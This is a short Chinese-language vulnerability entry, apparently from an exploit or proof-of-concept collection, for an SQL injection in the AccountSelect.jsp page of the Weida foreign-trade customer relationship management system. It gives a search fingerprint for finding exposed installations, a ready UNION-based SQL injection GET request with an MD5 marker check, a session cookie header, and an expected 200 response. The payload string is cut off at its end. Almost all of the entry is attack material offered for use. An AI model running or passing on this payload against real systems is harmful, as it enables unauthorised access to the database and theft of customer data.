# 维达外贸客户关系管理系统AccountSelect存在SQL注入漏洞

- **系统**：维达外贸客户关系管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="维达外贸客户关系管理系统"`
- **请求**：`GET /wap/common/AccountSelect.jsp?ids=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28126%29%2Bsys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%271%27))%2BCHAR%28126%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2`
- **关键头**：`Cookie: td_cookie=1074457600; JSESSIONID=39181F19E13050D67C506E097115F619`
- **预期**：200　|　—